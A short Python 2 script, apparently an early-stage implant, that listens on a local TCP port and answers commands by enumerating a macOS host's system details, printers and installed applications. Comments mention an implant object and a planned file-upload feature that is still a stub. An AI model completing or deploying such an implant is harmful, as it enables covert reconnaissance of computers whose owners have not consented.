import platform
import socket
import sys

from os_types import macintosh

TCP_IP = '127.0.0.1'
TCP_PORT = 8080
MAX_CONN = 1
BUFFER_SIZE = 1024

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((TCP_IP, TCP_PORT))
    s.listen(MAX_CONN)
except socket.error, (value, message):
    if s: 
        s.close() 
    print "Could not open socket: " + message 
    sys.exit(1)

while True:
    conn, addr = s.accept()
    data = conn.recv(BUFFER_SIZE)
    
    #use polymorphism to remove lengthy if/else?
    #https://jeffknupp.com/blog/2014/06/18/improve-your-python-python-classes-and-object-oriented-programming/
            
    if data == "enum_os":
        if platform.system() == 'Darwin':
            conn.send(macintosh.enum_os())
            #use encoder first, then send request
        else:
            break
    elif data == "enum_printers":
        if platform.system() == 'Darwin':
            conn.send(macintosh.enum_printers())
    elif data == "enum_applications":
        if platform.system() == 'Darwin':
            conn.send(macintosh.enum_applications())
    elif data == 'upload':
        conn.send("still working on")
        #common.upload(file, dir)
        #need to create implant obj and send to common for file transfer?
    else:
        conn.send("unknown command")
         
conn.close()